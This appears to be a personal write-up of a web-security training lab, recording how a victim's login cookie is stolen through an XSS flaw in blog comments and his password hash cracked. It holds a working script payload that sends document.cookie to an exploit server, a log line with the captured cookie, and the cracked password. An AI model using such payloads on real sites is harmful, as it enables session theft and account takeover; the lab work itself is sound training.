This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

---

**Goal:** Steal Carlos's cookie using XSS in the comments of one of the blog posts, and send the information to the provided exploit server. Log into the Carlos account and delete it. 

**Analysis:** The app has a vulnerable comment section that can be exploited with reflective XSS. The app stores the User/Pass in the `keep-logged-in` cookie which i verify by decoding the one it gives me for wiener. The second part is encoded md5 hash for the password. 
`wiener:51dc30ddc473d43a6011e9ebba6ca770`

**Payload:** 
```php
<script>document.location='https://Exploit_server'+document.cookie</script>
```

- Must use single quotes for the exploit server url.

After obtaining the cookie, i can use burp to decode the hash from base64, which gives me the username, and then use `crackstation` to decode the md5 password, and from there i can login and complete the task. 
- https://crackstation.net/


![[Pasted image 20240826094922.png]]

```php
10.0.4.93       2024-08-26 08:47:28 +0000 "GET /secret=zj0l4RG6wiyxRv5ukWR4dAZAk29guG4r;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

`Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

**User:** carlos
**Pass:** onceuponatime

_Now i can login and delete the account, completing the task._

---

**Completed:** _09:52 2024-08-26_
